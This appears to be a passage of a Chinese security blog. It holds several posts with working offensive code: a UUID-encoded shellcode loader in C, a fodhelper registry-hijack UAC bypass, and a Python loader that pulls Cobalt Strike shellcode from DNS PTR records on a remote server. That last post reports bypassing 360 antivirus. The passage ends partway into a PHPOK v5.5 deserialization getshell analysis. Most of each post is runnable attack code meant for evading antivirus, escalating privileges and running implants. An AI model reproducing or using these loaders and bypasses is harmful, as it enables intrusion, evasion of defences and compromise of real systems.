class="string">&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;</span>,</span><br><span class="line"><span class="string">&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;</span>,</span><br><span class="line"><span class="string">&quot;00000000-4800-8d8d-0101-000041ba318b&quot;</span>,</span><br><span class="line"><span class="string">&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;</span>,</span><br><span class="line"><span class="string">&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;</span>,</span><br><span class="line"><span class="string">&quot;00657865-0000-0000-0000-000000000000&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>); <span class="comment">//ha为指向申请堆的首地址的指针</span></span><br><span class="line">    DWORD_PTR hptr = (DWORD_PTR)ha;   <span class="comment">//让hptr指向ha</span></span><br><span class="line">    <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//转换后指向uuid地址保存在hptr</span></span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">            CloseHandle(ha);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hptr += <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>); <span class="comment">//把EnumSystemLocalesA参数中的回调函数设置为指向shellcode地址指针，执行shellcode</span></span><br><span class="line">    CloseHandle(ha);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6039dca0c9e7be00013afdd7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/874561fe-2ef9-4fb3-a6a4-05a9286bd1a9.png" alt="imgbed.cn图床"></a></p>
<h1 id="API函数"><a href="#API函数" class="headerlink" title="API函数"></a>API函数</h1><h2 id="UuidFromStringA"><a href="#UuidFromStringA" class="headerlink" title="UuidFromStringA"></a>UuidFromStringA</h2><p>将字符串形式的shellcode转换为UUID，成功返回RPC_S_OK，失败返回RPC_S_INVALID_STRING_UUID</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromStringA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid, <span class="comment">//指向字符串的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid <span class="comment">//以二进制形式返回指向UUID的指针。 </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="EnumSystemLocalesA"><a href="#EnumSystemLocalesA" class="headerlink" title="EnumSystemLocalesA"></a>EnumSystemLocalesA</h2><p>功能为枚举操作系统上安装或支持的语言环境，第一个参数为指向应用程序定义的回调函数的指针，将它设置为指向UUID的指针即可执行shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EnumSystemLocalesA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LOCALE_ENUMPROCA lpLocaleEnumProc, <span class="comment">///指向应用程序定义的回调函数的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD            dwFlags <span class="comment">//指定要枚举的语言环境标识符的标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-26T10:51:35.000Z" title="2021-02-26T10:51:35.000Z">2021-02-26</time>发表</span><span class="level-item"><time dateTime="2021-02-26T10:55:55.859Z" title="2021-02-26T10:55:55.859Z">2021-02-26</time>更新</span><span class="level-item">5 分钟读完 (大约712个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/">注册表劫持BypassUAC</a></h1><div class="content"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一部分系统程序可以直接获取管理员权限而不触发UAC弹窗，这类程序被称为白名单程序。如fodhelper</p>
<p>fodhelper.exe在启动过程查询注册表项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Classes\ms-settings\Shell\Open\command</span><br></pre></td></tr></table></figure>

<p>该键值对存储可执行文件路径，普通用户对HKCU有编辑权限，可以写入想要执行的任意文件，如cmd.exe，写入后的文件会以最高权限执行</p>
<p>如果上一个键值对存在，继续查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute</span><br></pre></td></tr></table></figure>

<p>若也存在，则读取第一个注册内的值执行</p>
<p>当找不到HKCU\Software\Classes\ms-settings\Shell\Open\command的时候才会去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command</p>
<p>默认情况下而HKCR\ms-settings\Classes\ms-settings\Shell\Open\command存在，而HKCU\Software\Classes\ms-settings\不存在，因此需要手动创建。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038d2e104fa2d0001e3c1a7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/238ed07e-992a-405b-aadc-e1e19b43335b.png" alt="imgbed.cn图床"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>1.RegCreateKeyA创建HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\</p>
<p>2.使用RegSetValueEx向创建的键值对里写入要执行的文件和DelegateExecute</p>
<p>3.CreateProcessA创建进程运行fodhelper.exe，以高权限运行向注册表中写入的文件</p>
<p>4.在一段时间后使用RegDeleteTreeA删除创建的键值对，恢复原状</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    HKEY hKey;</span><br><span class="line">    STARTUPINFOA StartupInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION ProcessInformation = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建注册表</span></span><br><span class="line">    RegCreateKeyA(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="comment">//写入要执行的文件</span></span><br><span class="line">    RegSetValueExA(hKey, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;cmd.exe&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;cmd.exe&quot;</span>));</span><br><span class="line">    <span class="comment">//写入DelegateExecute</span></span><br><span class="line">    RegSetValueExA(hKey, <span class="string">&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建进程，运行fodhelper以高权限执行写入的文件</span></span><br><span class="line">    CreateProcessA(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, (LPSTR)<span class="string">&quot;/c C:\\Windows\\System32\\fodhelper.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">    </span><br><span class="line">    Sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除创建的ms-settings</span></span><br><span class="line">    RegDeleteTreeA(hKey, <span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>);<span class="comment">//删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行前</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038d2eb9efdd1000198559c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/53a992dc-d44f-405b-9849-2cfaeb72aa97.png" alt="imgbed.cn图床"></a></p>
<p>执行后</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038d2f204fa2d0001e3c1d7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed3760d0-c0d5-46ff-9c79-73f2f3b2a87e.png" alt="imgbed.cn图床"></a></p>
<h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="RegCreateKeyA"><a href="#RegCreateKeyA" class="headerlink" title="RegCreateKeyA"></a>RegCreateKeyA</h2><p>创建键值对</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCreateKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey, </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY  phkResult</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>写入注册表键值</p>
<p>成功返回 ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY       hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄 </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR     lpValueName,<span class="comment">//指定要被查询或写入的键值的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      Reserved,<span class="comment">//保留，始终为0   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      dwType,<span class="comment">//写入键值的类型   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> BYTE *lpData,<span class="comment">//写入键值的缓冲区   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cbData<span class="comment">//写入键值缓冲区的长度    </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegDeleteTreeA"><a href="#RegDeleteTreeA" class="headerlink" title="RegDeleteTreeA"></a>RegDeleteTreeA</h2><p>删除键值对</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegDeleteTreeA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h2><p>创建进程</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-26T07:53:11.000Z" title="2021-02-26T07:53:11.000Z">2021-02-26</time>发表</span><span class="level-item"><time dateTime="2021-02-26T08:15:05.102Z" title="2021-02-26T08:15:05.102Z">2021-02-26</time>更新</span><span class="level-item">7 分钟读完 (大约1015个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/">python利用dns的PTR记录加载shellcode</a></h1><div class="content"><p>DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。</p>
<p>PTR记录的两个特性</p>
<p>1.不区分大小写，dns解析结果统一转为小写</p>
<p>2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。</p>
<p>在本地服务器添加</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9145dc5370001f7945a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png" alt="imgbed.cn图床"></a></p>
<p>进行反向解析查询，192.168.111.135为DNS服务器的ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt&#x3D;ptr 192.168.111.1 192.168.111.135</span><br></pre></td></tr></table></figure>



<p>可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a92234dcf30001560686"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png" alt="imgbed.cn图床"></a></p>
<p>用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9299efdd1000197edba"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png" alt="imgbed.cn图床"></a></p>
<p>分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a92ff6094a0001be155e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png" alt="imgbed.cn图床"></a></p>
<p>去掉所有的\x，把它们分割成多个部分按照顺序添加到PTR记录中</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a93854a29f0001250fb6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png" alt="imgbed.cn图床"></a></p>
<p>只需要按照顺序对相应的ip发起请求即可获得部分shellcode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a943002aec0001e11199"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png" alt="imgbed.cn图床"></a></p>
<p>利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> dns.reversename</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">dnsip=<span class="string">&#x27;192.168.111.135&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LoadshellCode</span>(<span class="params">shellcode</span>):</span>   <span class="comment">#执行shellcode</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestptr</span>(<span class="params">dnsip,ipnum</span>):</span>      <span class="comment">#获取PTR记录</span></span><br><span class="line">    ipaddr=<span class="string">&#x27;192.168.111.%d&#x27;</span> %ipnum    <span class="comment">#添加的PTR记录中主机ip地址的C段地址</span></span><br><span class="line">    ip=dns.reversename.from_address(ipaddr)</span><br><span class="line">    my_resolver = dns.resolver.Resolver()</span><br><span class="line">    my_resolver.nameservers = [dnsip]</span><br><span class="line">    answer = my_resolver.resolve(ip,<span class="string">&#x27;PTR&#x27;</span>)</span><br><span class="line">    recvptr=<span class="built_in">str</span>(answer[<span class="number">0</span>]).strip(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> recvptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">shellcodedemo</span>):</span>    <span class="comment">#将得到的shellcode转为十六进制</span></span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    s1=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(shellcodedemo))):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s1 += <span class="built_in">bytes</span>.fromhex(shellcodedemo[i:i + <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">60</span>):    <span class="comment">#根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)</span></span><br><span class="line">        s+=requestptr(dnsip,i)</span><br><span class="line">    LoadshellCode(str2hex(s))</span><br></pre></td></tr></table></figure>





<p>使用pyinstaller打包成exe文件，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w dnsptrshellcode.py</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png" alt="imgbed.cn图床"></a></p>
<p>pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/p1967914901/article/details/109706449">https://blog.csdn.net/p1967914901/article/details/109706449</a></p>
<p>拿到beacon</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a94a171e740001e39ed5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png" alt="imgbed.cn图床"></a></p>
<p>可以绕过360，但被火绒查杀</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a95c6cea45000126276c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png" alt="imgbed.cn图床"></a></p>
<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/sp4zcmd/DnsPTRShellcodeLoader">https://github.com/sp4zcmd/DnsPTRShellcodeLoader</a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/185324.html">https://www.freebuf.com/articles/network/185324.html</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-08T01:03:42.000Z" title="2021-02-08T01:03:42.000Z">2021-02-08</time>发表</span><span class="level-item"><time dateTime="2021-02-08T01:12:41.823Z" title="2021-02-08T01:12:41.823Z">2021-02-08</time>更新</span><span class="level-item">13 分钟读完 (大约1901个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/">PHPOK v5.5 csrf+反序列化漏洞getshell分析</a></h1><div class="content"><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>PHPOK v5.5</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p>phpokcms代码结构，关键代码都在framework文件夹下</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e13002aec00018e149e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/396424e7-befd-4ca5-86f5-01f588c84272.png" alt="imgbed.cn图床"></a></p>
<p>phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹</p>
<p>请求url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;phpok&#x2F;admin.php?c&#x3D;address&amp;f&#x3D;open</span><br></pre></td></tr></table></figure>

<p>参数c的值拼接上<code>_control.php</code>就是对应的文件，对应的类即参数c的值拼接上_control，如address_control</p>
<p>参数f的值拼接上<code>_f</code>就是对应的方法,如open_f</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e27d6547d0001d38fd5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f14ddf62-a3af-419b-ad36-b8d5d71f1703.png" alt="imgbed.cn图床"></a>](<a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e205dc5370001a461a4">https://imgbed.cn/preview?id=60208e205dc5370001a461a4</a>)</p>
<h2 id="可利用恶意类"><a href="#可利用恶意类" class="headerlink" title="可利用恶意类"></a>可利用恶意类</h2><p>文件位置：/framework/engine/cache.php </p>
<p>__destruct()调用了save方法，在save方法中使用了file_put_contents函数，函数的第一个和第二个参数均可控，但是第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;save(<span 